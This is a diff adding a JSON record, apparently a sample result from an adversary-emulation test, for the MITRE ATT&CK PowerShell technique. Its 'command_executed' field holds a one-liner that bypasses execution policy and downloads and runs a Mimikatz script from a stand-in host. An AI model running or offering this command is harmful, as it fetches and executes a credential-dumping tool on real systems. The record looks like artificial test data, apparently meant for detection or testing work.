@@ -1,0 +1,25 @@
+{
+  "technique": {
+    "id": "T1059.001",
+    "name": "PowerShell",
+    "tactic": "execution"
+  },
+  "test_name": "Invoke-Mimikatz via PowerShell Script",
+  "test_guid": "f3a9b2c4-5678-1234-abcd-ef1234567890",
+  "host": "TESTHOST",
+  "timestamp": "2024-01-01T00:00:00Z",
+  "success": true,
+  "command_executed": "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://test/mimikatz.ps1')",
+  "process_id": 4567,
+  "parent_process": "cmd.exe",
+  "user": "TESTHOST\\testuser",
+  "output": "Logged on users detected",
+  "artifacts": [
+    {
+      "type": "file",
+      "path": "C:\\Users\\testuser\\AppData\\Local\\Temp\\test.ps1",
+      "hash": "abc123def456"
+    }
+  ],
+  "cleanup_performed": false
+}
